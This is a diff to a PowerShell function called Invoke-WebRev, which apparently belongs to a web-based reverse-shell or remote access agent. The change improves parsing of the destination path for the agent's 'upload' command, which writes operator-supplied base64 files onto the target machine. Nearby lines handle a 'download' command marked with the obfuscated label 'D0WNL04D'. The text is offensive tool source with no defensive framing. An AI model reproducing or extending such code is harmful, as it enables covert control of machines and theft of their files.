@@ -60,14 +60,21 @@ function Invoke-WebRev{
                 try
                 {
                     $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
-                    $location = $cstr.split(" ")[2];
+                    if ($cstr.split(" ").Length -eq 3) {
+                        $location = $cstr.split(" ")[2];
+                    }
+                    elseif ($cstr.Substring($cstr.Length-1) -eq '"') {
+                        $location = $cstr.split('"') | Select-Object -SkipLast 1 | Select-Object -Last 1;
+                    }
+                    else {
+                        $location = $cstr.split(' ') | Select-Object -Last 1;;
+                    }
                     $content = [System.Convert]::FromBase64String($uploadData);
                     $content | Set-Content $location -Encoding Byte
                     $result = '[+] File successfully uploaded.';
                 }
                 catch {}
             }
-
             elseif($cstr.split(" ")[0] -eq "download")
             {
                 $type = '"type":"D0WNL04D"';
